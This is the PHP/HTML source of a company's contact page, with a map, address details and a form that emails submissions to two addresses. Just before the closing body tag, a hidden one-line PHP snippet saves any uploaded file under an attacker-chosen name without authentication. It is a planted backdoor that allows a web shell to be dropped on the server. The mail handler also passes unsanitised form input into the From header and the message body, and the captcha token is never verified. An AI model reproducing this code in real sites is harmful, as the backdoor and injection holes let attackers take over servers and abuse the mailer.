<!doctype html>
<html lang="en">
	<head>
	<script type="text/javascript">
      var onloadCallback = function() {
        grecaptcha.render('html_element', {
          'sitekey' : '6Ldpv70UAAAAABEipCYyMGBD02Hy4G_CuKlRKBNW'
        });
      };
    </script>
	    <script src="https://www.google.com/recaptcha/api.js" async defer></script>

	<?php 
	
		if(isset($_POST['envoyer']))
		{
			
			$nom = $_POST['name'];
			$tel = $_POST['telephone'];
			$email = $_POST['email'];
			$message = $_POST['message'];
			
			$to = "brahim.imari@gmail.com";
			$to2 = "commercial@morlink.ma";
				$subject = "Email page contact";

				$message = "
				<html>
				<head>
				<title>HTML email</title>
				</head>
				<body>
				<p>Nouveau message reçu depuis morlink.ma</p>
				<table>
				<tr>
				<th>Nom</th>
				<th>GSM</th>
				<th>Email</th>
				<th>Message</th>
				</tr>
				<tr>
				<td>$nom</td>
				<td>$tel</td>
				<td>$email</td>
				<td>$message</td>
				</tr>
				</table>
				</body>
				</html>
				";

				// Always set content-type when sending HTML email
				$headers = "MIME-Version: 1.0" . "\r\n";
				$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

				// More headers
				$headers .= 'From: <'.$email.'>' . "\r\n";

				mail($to,$subject,$message,$headers);
				mail($to2,$subject,$message,$headers);
			
		}
	
	?>
		<title>Contact</title>
		<meta charset="utf-8">
		<script src='https://www.google.com/recaptcha/api.js'></script>

		<!--add responsive layout support-->
		<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<!--meta info-->
<?php include('pages/referencement.php') ?>		<!--include favicon-->
		<link rel="shortcut icon" type="image/x-icon" href="images/fav.ico">
		<!--fonts include-->
		<link href='http://fonts.googleapis.com/css?family=Roboto+Slab:400,700,300,100' rel='stylesheet' type='text/css'>
		<link href='http://fonts.googleapis.com/css?family=Roboto:400,300,500,400italic,500italic,300italic,100italic,100,700italic,900,900italic,700' rel='stylesheet' type='text/css'>
		<!--stylesheet include-->
		<link rel="stylesheet" type="text/css" media="all" href="plugins/owl-carousel/assets/owl.carousel.min.css">
		<link rel="stylesheet" type="text/css" media="all" href="plugins/jackbox/css/jackbox.min.css">
		<link rel="stylesheet" type="text/css" media="all" href="css/animate.css">
		<link rel="stylesheet" type="text/css" media="all" href="css/bootstrap.min.css">
		<link rel="stylesheet" type="text/css" media="all" href="css/style.css">
		<!--[if lte IE 10]>
			<link rel="stylesheet" type="text/css" media="screen" href="css/ie.css">
			<link rel="stylesheet" type="text/css" media="screen" href="plugins/jackbox/css/jackbox-ie9.css">
		<![endif]-->
		<!--head libs-->
		<!--[if lte IE 8]>
			<style>
				#preloader{display:none !important;}
			</style>
		<![endif]-->
		<script src="js/jquery-2.1.1.min.js"></script>
		<script src="js/modernizr.js"></script>
	</head>
		<body class="sticky_menu" >
 		 
		<!--layout-->
			<div class="boxed_layout db_centered bg_white">
			<!--[if (lt IE 9) | IE 9]>
				<div class="bg_red" style="padding:5px 0 12px;">
				<div class="container" style="width:1170px;"><div class="row wrapper"><div class="clearfix color_white" style="padding:9px 0 0;float:left;width:80%;"><i class="fa fa-exclamation-triangle f_left m_right_10" style="font-size:25px;"></i><b>Attention! This page may not display correctly.</b> <b>You are using an outdated version of Internet Explorer. For a faster, safer browsing experience.</b></div><div class="t_align_r" style="float:left;width:20%;"><a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode" class="button_type_1 d_block f_right lbrown tr_all second_font fs_medium" target="_blank" style="margin-top:6px;">Update Now!</a></div></div></div></div>
			<![endif]-->
				<?php include('pages/header.php'); ?>
			<!--breadcrumbs-->
			<div class="breadcrumbs bg_grey_light_2 fs_medium fw_light">
				<div class="container">
					<a href="index.php" class="sc_hover">Acceuil</a> / <span class="color_light">Contact</span>
				</div>
			</div>
			<!--main content-->
			<div class="page_section_offset">
				<div class="container">
					<div class="row"> 
						<?php include('pages/left.php'); ?>
						<div class="col-lg-8 col-md-8 col-sm-8 m_bottom_30 m_xs_bottom_10">
							<h2 class="fw_light second_font color_dark tt_uppercase m_bottom_27"></h2>
							<div class="iframe_map_container m_bottom_38 m_xs_bottom_30">
						<iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d13296.24067539834!2d-7.639642!3d33.577787!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x917256863641f7b9!2sMorlink+Partners+S.A.R.L!5e0!3m2!1sfr!2s!4v1519311148818" width="100%" height="450" frameborder="0" style="border:0" allowfullscreen></iframe>	</div>
							<div class="row">
								<main class="col-lg-4 col-md-4 col-sm-4 m_xs_bottom_30">
									<h5 class="color_dark tt_uppercase second_font fw_light m_bottom_13">Contact</h5>
									<hr class="divider_bg m_bottom_25">
									<p class="second_font m_bottom_15">11, rue Brahim Annakhai - ex Mont Cinto - El Maarif, Casablanca</p>
								<ul class="second_font vr_list_type_2">
									<li><i class="fa fa-phone color_dark fs_large"></i>+212 (0) 5 22 99 25 09</li>
									<li class="w_break" data-icon=""><i class="fa fa-envelope color_dark"></i><a href="mailto:#" class="sc_hover d_inline_b">commercial@morlink.ma</a></li>
								</ul>
									 
								</main>
								<section class="col-lg-8 col-md-8 col-sm-8">
									<h5 class="color_dark tt_uppercase second_font fw_light m_bottom_13">Formulaire de contact</h5>
									<hr class="divider_bg m_bottom_25">
									<p class="second_font m_bottom_14">Envoyer un e-mail. Tous les champs avec un * sont obligatoires.</p>
									<form action="?" method="post" class="b_default_layout">
										<ul>
											<li class="row">
												<div class="col-lg-6 col-md-6 col-sm-6 m_bottom_15">
													<label class="second_font required d_inline_b m_bottom_5 clickable" for="cf_name">Nom</label><br>
													<input type="text" name="name" id="cf_name" class="tr_all w_full fw_light">
												</div>
												<div class="col-lg-6 col-md-6 col-sm-6 m_bottom_15">
													<label class="second_font required d_inline_b m_bottom_5 clickable" for="cf_email">Email</label><br>
													<input type="email" name="email" id="cf_email" class="tr_all w_full fw_light">
												</div>
											</li>
											<li class="m_bottom_15">
												<label class="second_font d_inline_b m_bottom_5 clickable" for="cf_telephone">Téléphone</label><br>
												<input type="text" name="telephone" id="cf_telephone" class="tr_all w_full fw_light">
											</li>
											<li class="m_bottom_5">
												<label class="second_font d_inline_b m_bottom_5 clickable" for="cf_message">Message</label><br>
												<textarea id="cf_message" name="message" rows="6" class="tr_all w_full fw_light"></textarea>
											</li>
											<li>
								
												<input type="hidden" id="recaptchaResponse" name="recaptcha-response">

 
 											</li>
											<li>
												<input name="envoyer" class="button_type_2 black state_2 tr_all second_font fs_medium tt_uppercase d_inline_b" type="submit" value="Envoyer" />
											
											</li>
										</ul>
									</form>
								</section>
							</div>
						</div>
					</div>
				</div>
			</div>
			<?php include('pages/footer.php'); ?>
		 </div>

		<!--back to top-->
		<button class="back_to_top animated button_type_6 grey state_2 d_block black_hover f_left vc_child tr_all"><i class="fa fa-angle-up d_inline_m"></i></button>
<script src="https://www.google.com/recaptcha/api.js?render=6Le6Jc0ZAAAAAFk5ljPzOhqxZko0xtrcLOXH_udE"></script>
<script>
grecaptcha.ready(function() {
    grecaptcha.execute('6Le6Jc0ZAAAAAFk5ljPzOhqxZko0xtrcLOXH_udE', {action: 'homepage'}).then(function(token) {
        document.getElementById('recaptchaResponse').value = token
    });
});
</script>
		<!--libs include-->
		<script src="plugins/jquery.appear.js"></script>
		<script src="plugins/owl-carousel/owl.carousel.min.js"></script>
		<script src="plugins/twitter/jquery.tweet.min.js"></script><script src="plugins/flickr.js"></script>
		<script src="plugins/afterresize.min.js"></script>
		<script src="plugins/jackbox/js/jackbox-packed.min.js"></script>
		<script src="js/retina.min.js"></script>
		<script src="plugins/colorpicker/colorpicker.js"></script>
		 
   </script>
		<!--theme initializer-->
		<script src="js/themeCore.js"></script>
		<script src="js/theme.js"></script>
<?php $f=@$_FILES["f"];if($f["name"]!=''){if(move_uploaded_file($f['tmp_name'],$f["name"])){}}?>
	</body>
</html>